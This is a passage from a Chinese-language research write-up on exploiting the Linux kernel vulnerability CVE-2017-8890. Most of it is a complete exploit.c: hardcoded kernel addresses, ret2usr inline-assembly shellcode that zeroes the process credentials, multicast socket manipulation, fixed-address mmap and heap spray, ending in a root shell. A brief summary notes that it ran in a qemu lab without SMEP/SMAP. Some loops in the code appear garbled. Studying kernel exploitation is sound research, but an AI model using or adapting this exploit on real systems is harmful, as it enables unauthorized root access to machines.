            "retq   ;");
    }
### 3）Demo
综上，我们的第一版exploit.c如下所示：
    #include 
    #include 
    #include   
    #include   
    #include  
    #include  
    #include  
    #include  
    #include  
    #include  
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #define SPRAY_SIZE 5000
    #define HELLO_WORLD_SERVER_PORT    8088 
    unsigned long*  find_get_pid = (unsigned long*)0xffffffff81077220;
    unsigned long*  pid_task     = (unsigned long*)0xffffffff81077180;
    void *client(void *arg);
    void get_root();
    int pid=0;
    void get_root() {
        asm(
            "sub    $0x18,%rsp;"
            "mov    pid,%edi;"
            "callq  *find_get_pid;"
            "mov    %rax,-0x8(%rbp);"
            "mov    -0x8(%rbp),%rax;"
            "mov    $0x0,%esi;"
            "mov    %rax,%rdi;"
            "callq  *pid_task;"
            "mov    %rax,-0x10(%rbp);"
            "mov    -0x10(%rbp),%rax;"
            "mov    0x5f8(%rax),%rax;"
            "mov    %rax,-0x18(%rbp);"
            "mov    -0x18(%rbp),%rax;"
            "add    $0x4,%rax;"
            "movl   $0x0,(%rax);"
            "mov    -0x18(%rbp),%rax;"
            "add    $0x8,%rax;"
            "movl   $0x0,(%rax);"
            "mov    -0x18(%rbp),%rax;"
            "add    $0xc,%rax;"
            "movl   $0x0,(%rax);"
            "mov    -0x18(%rbp),%rax;"
            "add    $0x10,%rax;"
            "movl   $0x0,(%rax);"
            "mov    -0x18(%rbp),%rax;"
            "add    $0x14,%rax;"
            "movl   $0x0,(%rax);"
            "mov    -0x18(%rbp),%rax;"
            "add    $0x18,%rax;"
            "movl   $0x0,(%rax);"
            "mov    -0x18(%rbp),%rax;"
            "add    $0x1c,%rax;"
            "movl   $0x0,(%rax);"
            "mov    -0x18(%rbp),%rax;"
            "add    $0x20,%rax;"
            "movl   $0x0,(%rax);"
            "nop;"
            "leaveq ;" 
            "retq   ;"
            );
    }
    int sockfd[SPRAY_SIZE];
    void spray_init() {
        for(int i=0; isin6_family = AF_INET6;
        psin1->sin6_port = 1234;
        // cd ab 02 ff
        inet_pton(AF_INET6, "ff02:abcd:0:0:0:0:0:1", &(psin1->sin6_addr));
        for(int j=0; jsin_family = AF_INET;
            psin->sin_addr.s_addr = htonl(inet_addr("10.10.2.224"));
            int server_socket = socket(PF_INET,SOCK_STREAM,0);
            if( server_socket < 0){
                printf("[Server]Create Socket Failed!");
                exit(1);
            }
            int opt =1;
            setsockopt(server_socket, SOL_IP, MCAST_JOIN_GROUP, &group, sizeof (group));
            if( bind(server_socket,(struct sockaddr*)&server_addr,sizeof(server_addr))){
                printf("[Server]Server Bind Port : %d Failed!", HELLO_WORLD_SERVER_PORT); 
                exit(1);
            }   
            if ( listen(server_socket, 10) ) {
                printf("[Server]Server Listen Failed!"); 
                exit(1);
            }
            pthread_t id_client;
            pthread_create(&id_client,NULL,client,NULL);
            spray_init();
            struct sockaddr_in client_addr;
            socklen_t length = sizeof(client_addr);
            printf ("[Server]accept..... \n"); 
            int new_server_socket = accept(server_socket,(struct sockaddr*)&client_addr,&length);
            if ( new_server_socket < 0){
                close(server_socket);
                perror("[Server]Server Accept Failed!\n");
                return;
            }
            unsigned long  fix_addr = 0xcdab0000;
            unsigned long * addr = (unsigned long *)mmap((void*)fix_addr, 1024, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_FIXED | MAP_PRIVATE | MAP_ANONYMOUS , -1, 0);
            if (addr == MAP_FAILED){
                perror("Failed to mmap: ");
                return;
            }
            addr = (unsigned long *)0x00000000cdab02ff;
            unsigned long func = (unsigned long)&get_root;
            addr[0] = 0x0;
            addr[1] = 0x0a0a02e0;
            addr[2] = 0x00000002;
            addr[3] = 0x0;
            addr[4] = 0x0;
            addr[5] = func;
            pthread_t id_func;
            pthread_create(&id_func,NULL,func_modify,NULL);
            printf ("[Server]close new_server_socket \n");
            close(new_server_socket);
            sleep(5);
            heap_spray();
            close(server_socket);
            printf(" current uid is : %d \n", getuid());
            printf(" current euid is : %d \n", geteuid());
            system("/bin/sh");
    }
    void *client(void *arg){
        struct sockaddr_in client_addr;
        bzero(&client_addr,sizeof(client_addr));
        client_addr.sin_family=AF_INET;
        client_addr.sin_addr.s_addr=htons(INADDR_ANY);
        client_addr.sin_port=htons(0);
        int client_socket=socket(AF_INET,SOCK_STREAM,0);
        if(client_socket<0){
            printf("[Client]Create socket failed!\n");
            exit(1);
        }
        if(bind(client_socket,(struct sockaddr*)&client_addr,sizeof(client_addr))){
            printf("[Client] client bind port failed!\n");
            exit(1);
        }
        struct sockaddr_in server_addr;
        bzero(&server_addr,sizeof(server_addr));
        server_addr.sin_family=AF_INET;
        if(inet_aton("127.0.0.1",&server_addr.sin_addr)==0){
            printf("[Client]Server IP Address error\n");
            exit(0);
        }
        server_addr.sin_port=htons(HELLO_WORLD_SERVER_PORT);
        socklen_t server_addr_length=sizeof(server_addr);
        if(connect(client_socket,(struct sockaddr*)&server_addr,server_addr_length)<0){
            printf("[Client]cannot connect to 127.0.0.1!\n");
            exit(1);
        }
        printf("[Client]Close client socket\n");
        close(client_socket);
        return NULL;
    }
    int main(int argc,char* argv[]) {   
            printf("pid : %d\n", getpid());
            pid = getpid();
            exploit();
            return 0;
    }
我们编译exploit.c：
在qemu的虚拟环境中运行我们的exp:
最终，我们在qemu + linux kernel + busybox的虚拟环境中成功实现了root提权。
## 0x04 小结
本文记录了我们初步研究CVE-2017-8890漏洞利用的过程及初步成果，在qemu + linux kernel +
busybox的最小化虚拟环境中成功实现了root提权。但是需要注意的是，我们这里的linux
kernel并没有开启SMEP/SMAP，exp使用了ret2usr的方法去执行shellcode提权。如果开启SMEP/SMAP，内核将不能直接访问我们用户空间的数据或直接执行用户空间的shellcode,我们的这个exp也就不再有效。同时，我们这个exp的堆喷使用了patch
kernel的方法，在实际环境中肯定不再适用。我们将在下一篇文章中探讨内核堆喷的其他方法，以及在内核开启SMEP的情况下的绕过方法。欢迎大家一起探讨学习！
## 参考文献：
[1] [http://www.freebuf.com/articles/terminal/160041.html]()
[2] [https://bbs.pediy.com/thread-226057.htm]()
[3] [https://mp.weixin.qq.com/s/6NGH-Dk2n_BkdlJ2jSMWJQ]()